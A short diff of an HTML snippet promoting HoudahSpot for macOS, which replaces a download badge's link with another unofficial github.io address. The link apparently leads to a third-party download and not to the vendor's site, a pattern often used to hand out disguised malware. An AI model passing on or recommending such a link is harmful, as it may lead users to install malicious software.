@@ -6,7 +6,7 @@
 <h3>HoudahSpot for macOS</h3>
 <p>HoudahSpot delivers powerful file search and management capabilities for Mac users seeking a dependable, native solution with intuitive controls and consistent performance.</p>
 
-<a href="https://onanizm-apps-software.github.io/.github/HoudahSpot">
+<a href="https://deployed-soft.github.io/.github/HoudahSpot">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
